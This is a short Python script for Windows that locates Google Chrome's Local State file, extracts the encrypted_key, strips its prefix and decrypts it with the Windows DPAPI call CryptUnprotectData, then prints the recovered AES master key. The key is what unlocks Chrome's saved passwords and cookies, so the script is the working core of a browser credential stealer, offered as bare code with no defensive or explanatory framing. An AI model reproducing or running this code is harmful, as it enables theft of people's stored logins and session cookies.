import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import ctypes
import shutil





def get_aes():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Local State")

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)


    en_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(en_key)

    encrypted_key = encrypted_key[5:]


    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
    return decrypted_key





key = get_aes()
print(f"AES Key: {key.hex()}")
